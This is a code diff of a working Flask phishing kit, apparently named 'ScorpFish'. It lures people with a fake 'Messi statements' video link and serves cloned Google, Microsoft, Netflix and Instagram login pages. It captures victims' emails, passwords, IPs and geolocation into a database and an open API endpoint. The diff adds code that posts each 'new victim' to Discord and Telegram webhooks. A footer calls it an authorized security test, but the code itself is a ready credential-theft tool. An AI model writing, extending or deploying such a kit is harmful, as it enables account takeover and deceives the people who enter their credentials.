@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
-import os
 from flask import Flask, request, render_template_string, redirect, jsonify
 import sqlite3
 import json
 import requests
 from datetime import datetime
-import re
+import os
 
 app = Flask(__name__)
 
+# Inicializar DB
 def init_db():
     conn = sqlite3.connect('credentials.db')
     cursor = conn.cursor()
@@ -35,31 +35,30 @@ def get_template():
     except:
         template_name = 'google'
     
-    google_template = '''
+    templates = {
+        'google': '''
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <link rel="icon" href="data:;base64,iVBORw0KGgo=">
+    
+    <!-- METADATOS PARA TODAS LAS REDES SOCIALES -->
     <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
-    <meta property="og:description" content="El astro argentino revela detalles inéditos de su carrera y futuro" />
+    <meta property="og:description" content="Me dijeron que ganaría" />
     <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
-    <meta property="og:image:secure_url" content="https://i.imgur.com/kgo0gfA.png" />
-    <meta property="og:image:width" content="1200" />
-    <meta property="og:image:height" content="630" />
-    <meta property="og:url" content="https://video-messi.onrender.com" />
-    <meta property="og:type" content="video.other" />
+    <meta property="og:url" content="https://video-xeen.onrender.com" />
+    <meta property="og:type" content="website" />
     <meta property="og:site_name" content="Messi Declaraciones" />
-    <meta property="og:video" content="https://i.imgur.com/kgo0gfA.png" />
-    <meta property="og:video:width" content="1280" />
-    <meta property="og:video:height" content="720" />
-    <meta name="twitter:card" content="player" />
+    
+    <!-- METADATOS PARA TWITTER -->
+    <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
-    <meta name="twitter:description" content="El astro argentino revela detalles inéditos" />
+    <meta name="twitter:description" content="Me dijeron que ganaría" />
     <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png" />
-    <meta name="twitter:player" content="https://video-messi.onrender.com" />
-    <meta name="twitter:player:width" content="1280" />
-    <meta name="twitter:player:height" content="720" />
+    
+    <!-- METADATOS PARA WHATSAPP (usa los mismos de og:) -->
+    
     <title>😲 Fuertes declaraciones de Messi</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
@@ -73,181 +72,190 @@ def get_template():
         button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
         button:hover { background: #1557b0; }
         .footer { margin-top: 30px; font-size: 14px; color: #5f6368; }
-        .hidden-video { display: none; }
     </style>
 </head>
 <body>
-    <div class="hidden-video">
-        <video width="1280" height="720">
-            <source src="https://i.imgur.com/kgo0gfA.png" type="video/mp4">
-        </video>
-    </div>
     <div class="container">
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
         <h1>Iniciar sesión</h1>
-        <p>Utiliza tu cuenta de Google para ver el video completo</p>
+        <p>Utiliza tu cuenta de Google</p>
         <form action="/capture" method="POST">
             <input type="email" name="email" placeholder="Correo electrónico" required>
             <input type="password" name="password" placeholder="Contraseña" required>
             <button type="submit">Siguiente</button>
         </form>
-        <div class="footer">Verificación de seguridad requerida</div>
+        <div class="footer">Prueba de seguridad autorizada</div>
+    </div>
+</body>
+</html>''',
+        'microsoft': '''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Iniciar sesión en tu cuenta</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: linear-gradient(120deg, #f0f0f0 0%, #e0e0e0 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+        .logo { width: 108px; margin-bottom: 16px; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: #1b1b1b; }
+        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccc; font-size: 15px; }
+        button { width: 100%; padding: 12px; background: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; }
+        button:hover { background: #005a9e; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
+        <h1>Iniciar sesión</h1>
+        <form action="/capture" method="POST">
+            <input type="email" name="email" placeholder="Correo, teléfono o Skype" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+    </div>
+</body>
+</html>''',
+        'netflix': '''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Netflix</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', sans-serif; }
+        body { background: black; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: rgba(0,0,0,0.75); padding: 60px 68px; width: 450px; border-radius: 4px; }
+        h1 { color: white; font-size: 32px; margin-bottom: 28px; font-weight: 700; }
+        input { width: 100%; padding: 16px; margin-bottom: 16px; background: #333; border: none; border-radius: 4px; color: white; font-size: 16px; }
+        button { width: 100%; padding: 16px; background: #e50914; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; }
+        button:hover { background: #f40612; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Iniciar sesión</h1>
+        <form action="/capture" method="POST">
+            <input type="email" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+    </div>
+</body>
+</html>''',
+        'instagram': '''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
+        .logo { font-size: 40px; font-family: 'Brush Script MT', cursive; margin-bottom: 30px; }
+        input { width: 100%; padding: 9px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; }
+        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 12px; }
+        button:hover { background: #0081d6; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Instagram</div>
+        <form action="/capture" method="POST">
+            <input type="text" name="email" placeholder="Teléfono, usuario o correo" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar sesión</button>
+        </form>
     </div>
 </body>
 </html>'''
-    
-    templates = {
-        'google': google_template,
-        'instagram': google_template.replace('Google', 'Instagram').replace('google', 'instagram'),
-        'microsoft': google_template.replace('Google', 'Microsoft').replace('google', 'microsoft'),
-        'netflix': google_template.replace('Google', 'Netflix').replace('google', 'netflix')
     }
     
     return templates.get(template_name, templates['google'])
 
+def send_webhook(data):
+    try:
+        with open('webhook_config.json', 'r') as f:
+            config = json.load(f)
+    except:
+        return
+    
+    # Discord
+    if config.get('discord_webhook'):
+        try:
+            import requests
+            message = {
+                "content": f"🎯 **Nueva víctima!**\\n📍 IP: {data['ip']}\\n👤 Usuario: {data['username']}\\n🔑 Pass: {data['password'][:10]}...",
+                "username": "ScorpFish Bot"
+            }
+            requests.post(config['discord_webhook'], json=message, timeout=5)
+        except:
+            pass
+    
+    # Telegram
+    if config.get('telegram_token') and config.get('telegram_chat'):
+        try:
+            url = f"https://api.telegram.org/bot{config['telegram_token']}/sendMessage"
+            message = f"🎯 Nueva víctima!\\n📍 IP: {data['ip']}\\n👤 Usuario: {data['username']}"
+            requests.post(url, json={"chat_id": config['telegram_chat'], "text": message}, timeout=5)
+        except:
+            pass
+
 @app.route('/')
 def index():
-    user_agent = request.headers.get('User-Agent', '').lower()
-    if any(bot in user_agent for bot in ['facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot']):
-        return render_template_string('''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
-            <meta property="og:description" content="El astro argentino revela detalles inéditos de su carrera y futuro" />
-            <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
-            <meta property="og:image:width" content="1200" />
-            <meta property="og:image:height" content="630" />
-            <meta property="og:url" content="https://video-messi.onrender.com" />
-            <meta property="og:type" content="video.other" />
-            <meta property="og:video" content="https://i.imgur.com/kgo0gfA.png" />
-            <meta name="twitter:card" content="player" />
-            <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
-            <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png" />
-        </head>
-        <body>
-            <h1>Messi Declaraciones</h1>
-            <p>Video exclusivo</p>
-        </body>
-        </html>
-        ''')
+    # MODO PRUEBA: SIN BLOQUEOS PARA QUE FUNCIONE EN TODAS PARTES
     return render_template_string(get_template())
 
 @app.route('/capture', methods=['POST'])
 def capture():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if ip and ',' in ip:
-        ip = ip.split(',')[0].strip()
+    
     try:
-        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
-        if geo.get('status') == 'success':
-            location = f"{geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}"
-        else:
-            location = "Unknown"
+        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
+        location = f"{geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}"
     except:
         location = "Unknown"
-    username = request.form.get('email') or request.form.get('username', '')
-    password = request.form.get('password', '')
+    
     data = {
         'timestamp': datetime.now().isoformat(),
         'ip': ip,
-        'username': username,
-        'password': password,
-        'user_agent': request.headers.get('User-Agent', ''),
-        'referer': request.headers.get('Referer', ''),
+        'username': request.form.get('email') or request.form.get('username'),
+        'password': request.form.get('password'),
+        'user_agent': request.headers.get('User-Agent'),
+        'referer': request.headers.get('Referer'),
         'geo_location': location
     }
-    try:
-        conn = sqlite3.connect('credentials.db')
-        cursor = conn.cursor()
-        cursor.execute('''
-            INSERT INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location)
-            VALUES (?, ?, ?, ?, ?, ?, ?)
-        ''', (data['timestamp'], data['ip'], data['username'], data['password'], 
-              data['user_agent'], data['referer'], data['geo_location']))
-        conn.commit()
-        conn.close()
-        with open('credentials.txt', 'a', encoding='utf-8') as f:
-            f.write(f"{data['timestamp']} | {data['ip']} | {data['username']} | {data['password']} | {data['geo_location']}\n")
-    except Exception as e:
-        print(f"Error guardando: {e}")
+    
+    # Guardar en DB
+    conn = sqlite3.connect('credentials.db')
+    cursor = conn.cursor()
+    cursor.execute('''
+        INSERT INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location)
+        VALUES (?, ?, ?, ?, ?, ?, ?)
+    ''', (data['timestamp'], data['ip'], data['username'], data['password'], 
+          data['user_agent'], data['referer'], data['geo_location']))
+    conn.commit()
+    conn.close()
+    
+    # Enviar webhook
+    send_webhook(data)
+    
+    # Redirigir
     return redirect("https://www.google.com")
 
 @app.route('/api/credentials')
 def api_credentials():
-    try:
-        conn = sqlite3.connect('credentials.db')
-        cursor = conn.cursor()
-        cursor.execute('SELECT * FROM credentials ORDER BY id DESC LIMIT 100')
-        data = cursor.fetchall()
-        conn.close()
-        return jsonify(data)
-    except:
-        return jsonify({"error": "Error al obtener datos"})
-
-@app.route('/admin')
-def admin():
-    try:
-        conn = sqlite3.connect('credentials.db')
-        cursor = conn.cursor()
-        cursor.execute('SELECT * FROM credentials ORDER BY id DESC LIMIT 50')
-        data = cursor.fetchall()
-        conn.close()
-        html = '''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Admin - Credenciales</title>
-            <style>
-                body { font-family: Arial; padding: 20px; background: #f0f0f0; }
-                table { width: 100%; border-collapse: collapse; background: white; }
-                th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
-                th { background: #1a73e8; color: white; }
-                tr:nth-child(even) { background: #f9f9f9; }
-                .count { background: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
-            </style>
-        </head>
-        <body>
-            <h1>📊 Panel de Administración</h1>
-            <div class="count">
-                <strong>Total capturas:</strong> ''' + str(len(data)) + '''
-            </div>
-            <table>
-                <tr>
-                    <th>ID</th>
-                    <th>Fecha</th>
-                    <th>IP</th>
-                    <th>Usuario</th>
-                    <th>Contraseña</th>
-                    <th>Ubicación</th>
-                </tr>
-        '''
-        for row in data:
-            html += f'''
-                <tr>
-                    <td>{row[0]}</td>
-                    <td>{row[1]}</td>
-                    <td>{row[2]}</td>
-                    <td>{row[3]}</td>
-                    <td>{row[4][:20]}{'...' if len(row[4]) > 20 else ''}</td>
-                    <td>{row[7]}</td>
-                </tr>
-            '''
-        html += '''
-            </table>
-        </body>
-        </html>
-        '''
-        return html
-    except:
-        return "Error al cargar el panel"
+    conn = sqlite3.connect('credentials.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT * FROM credentials ORDER BY id DESC')
+    data = cursor.fetchall()
+    conn.close()
+    return jsonify(data)
 
 if __name__ == '__main__':
     init_db()
-    port = int(os.environ.get('PORT', 8080))
-    print("="*50)
-    print("🚀 SERVIDOR INICIADO CORRECTAMENTE")
-    print("="*50)
-    print(f"📌 URL: http://localhost:{port}")
-    print("="*50)
-    app.run(host='0.0.0.0', port=port, debug=False)
+    print("[+] Servidor iniciado en http://localhost:8080")
+    print("[+] Presiona Ctrl+C para detener")
+    app.run(host='0.0.0.0', port=8080, debug=False)
